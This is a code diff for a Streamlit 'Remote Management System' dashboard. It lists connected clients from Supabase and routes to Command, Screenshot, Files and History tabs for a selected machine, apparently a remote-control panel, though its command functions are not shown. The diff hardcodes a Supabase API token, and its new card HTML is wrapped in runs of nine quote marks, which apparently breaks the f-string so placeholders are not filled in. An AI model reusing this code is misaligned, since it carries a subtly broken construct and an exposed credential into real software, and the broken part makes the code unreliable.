@@ -13,7 +13,7 @@ import requests
 # Initialize Supabase
 supabase = create_client(
     "https://nufgpguitvkxctpagwwf.supabase.co",
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZmdwZ3VpdHZreGN0cGFnd3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY5NTA0MTIsImV4cCI6MjA1MjUyNjQxMn0.-MLSuSnfllGJrrQMEfHrQjxZoeujy6jZiHG9L9jY6Ik"
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZmdwZ3VpdHZreGN0cGFnd3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY5NTA0MTIsImV4cCI6MjA1MjUyNjQxMn0.-MLSuSnfllGJrrQMEfHrQjxZoeujy6jZiHG9L9jY6Ik"  # replace with your API key if needed
 )
 
 # Page Configuration
@@ -23,15 +23,14 @@ st.set_page_config(
     layout="wide"
 )
 
-# Import external CSS for additional styling (optional)
-# Make sure the file style.css exists in the same directory.
+# Optional: Import external CSS for additional styling
 try:
     with open("style.css") as f:
         st.markdown('<style>' + f.read() + '</style>', unsafe_allow_html=True)
 except Exception:
     pass
 
-# Custom CSS (additional inline styles)
+# Custom CSS (inline)
 st.markdown("""
 <style>
     .client-card {
@@ -40,6 +39,11 @@ st.markdown("""
         border-radius: 15px;
         padding: 20px;
         margin: 15px 0;
+        cursor: pointer;
+        transition: transform 0.2s;
+    }
+    .client-card:hover {
+        transform: scale(1.02);
     }
     .status-online {
         color: #00FF00;
@@ -105,39 +109,7 @@ def load_lottieurl(url: str):
         return None
     return r.json()
 
-# UI Pages
-def show_home():
-    st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
-    st.write("Welcome to the Remote Management System dashboard. Below are the connected clients:")
-
-    # Get all clients from Supabase
-    clients = supabase.table('clients')\
-            .select('*')\
-            .order('last_seen', desc=True)\
-            .execute()
-
-    if not clients.data:
-        st.warning("No clients connected")
-        return
-
-    for c in clients.data:
-        status = get_client_status(c['last_seen'])
-        card_html = f"""
-        <div class="client-card">
-            <h3>{c['hostname']} ({c['client_id']})</h3>
-            <p><strong>OS:</strong> {c['os']}</p>
-            <p><strong>IP:</strong> {c['ip_address']}</p>
-            <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
-            <p><strong>Last Seen:</strong> {c['last_seen']}</p>
-        </div>
-        """
-        st.markdown(card_html, unsafe_allow_html=True)
-
-    # Optionally display a Lottie animation at the bottom of the home page
-    lottie_animation = load_lottieurl("https://assets3.lottiefiles.com/packages/lf20_yp2m9iwx.json")
-    if lottie_animation:
-        st_lottie(lottie_animation, height=300)
-
+# --- Dashboard Functions for a Selected Client ---
 def show_command_center(selected_client):
     st.header("Command Center")
     with st.form("command_form"):
@@ -224,11 +196,68 @@ def show_message_history(selected_client):
                         st.error(f"Error processing file message: {e}")
                 st.text(f"Status: {msg['status']}")
 
-# Sidebar Navigation using On Hover Tabs
+def show_client_dashboard(selected_client):
+    st.markdown(f"<div class='header-title'>Dashboard for Client: {selected_client}</div>", unsafe_allow_html=True)
+    tabs = st.tabs(["Command", "Screenshot", "Files", "History"])
+    with tabs[0]:
+        show_command_center(selected_client)
+    with tabs[1]:
+        show_screenshot(selected_client)
+    with tabs[2]:
+        show_file_manager(selected_client)
+    with tabs[3]:
+        show_message_history(selected_client)
+
+# --- Home Screen: Show All Clients as Clickable Cards ---
+def show_home():
+    st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
+    st.write("Click on a client below to manage it:")
+
+    # Get all clients from Supabase
+    clients = supabase.table('clients')\
+            .select('*')\
+            .order('last_seen', desc=True)\
+            .execute()
+
+    if not clients.data:
+        st.warning("No clients connected")
+        return
+
+    # Use columns to layout client cards (adjust number of columns as needed)
+    cols = st.columns(3)
+    for idx, c in enumerate(clients.data):
+        status = get_client_status(c['last_seen'])
+        card_html = f"""""""""
+        <div class="client-card" id="{c['client_id']}" style="padding: 20px;">
+            <h3>{c['hostname']}</h3>
+            <p><strong>ID:</strong> {c['client_id']}</p>
+            <p><strong>OS:</strong> {c['os']}</p>
+            <p><strong>IP:</strong> {c['ip_address']}</p>
+            <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
+            <p><strong>Last Seen:</strong> {c['last_seen']}</p>
+        </div>"""""""""
+        # Use a button for each card. When clicked, store selected client in session_state.
+        if cols[idx % 3].markdown(card_html, unsafe_allow_html=True):
+            pass
+        # Because st.markdown is not clickable by default, we add a button below each card.
+        if cols[idx % 3].button("Manage", key=c['client_id']):
+            st.session_state["selected_client"] = c['client_id']
+            st.experimental_rerun()  # Rerun the app to display the dashboard
+
+    # Optionally display a Lottie animation on the home screen
+    lottie_animation = load_lottieurl("https://assets3.lottiefiles.com/packages/lf20_yp2m9iwx.json")
+    if lottie_animation:
+        st_lottie(lottie_animation, height=300)
+
+# --- Main Routing ---
+if "selected_client" not in st.session_state:
+    st.session_state["selected_client"] = None
+
+# Sidebar Navigation using On Hover Tabs (when a client is selected)
 with st.sidebar:
     tabs = on_hover_tabs(
-        tabName=['Home', 'Clients', 'Command', 'Screenshot', 'Files', 'History'],
-        iconName=['home', 'users', 'terminal', 'camera', 'folder', 'clock'],
+        tabName=['Home', 'Dashboard'],
+        iconName=['home', 'dashboard'],
         default_choice=0,
         styles={
             'navtab': {
@@ -243,44 +272,15 @@ with st.sidebar:
             'iconStyle': {'position': 'fixed', 'left': '7.5px', 'text-align': 'left'},
             'tabStyle': {'list-style-type': 'none', 'margin-bottom': '30px', 'padding-left': '30px'}
         },
-        key="1"
+        key="main_nav"
     )
 
 # Main UI Routing
-if tabs == "Home":
+if tabs == "Home" or st.session_state["selected_client"] is None:
+    # Show the home screen with the list of clients
     show_home()
 else:
-    # For pages other than home, first require the selection of a client.
-    with st.sidebar:
-        clients = supabase.table('clients')\
-            .select('*')\
-            .order('last_seen', desc=True)\
-            .execute()
-        if clients.data:
-            selected_client = st.selectbox(
-                "Select Client",
-                options=[c['client_id'] for c in clients.data],
-                format_func=lambda x: next(
-                    (f"{c['hostname']} ({c['client_id']})" 
-                     for c in clients.data if c['client_id'] == x),
-                    x
-                )
-            )
-        else:
-            st.warning("No clients connected")
-            selected_client = None
-
-    if selected_client:
-        if tabs == "Clients":
-            show_home()  # "Clients" page can show the same info as the home page.
-        elif tabs == "Command":
-            show_command_center(selected_client)
-        elif tabs == "Screenshot":
-            show_screenshot(selected_client)
-        elif tabs == "Files":
-            show_file_manager(selected_client)
-        elif tabs == "History":
-            show_message_history(selected_client)
-    else:
-        st.error("Please ensure at least one client is connected.")
-
+    # A client has been selected. Show a "Back" button to return to the home screen.
+    st.sidebar.button("Back to Home", key="back", on_click=lambda: st.session_state.update({"selected_client": None}))
+    # Show dashboard for the selected client
+    show_client_dashboard(st.session_state["selected_client"])
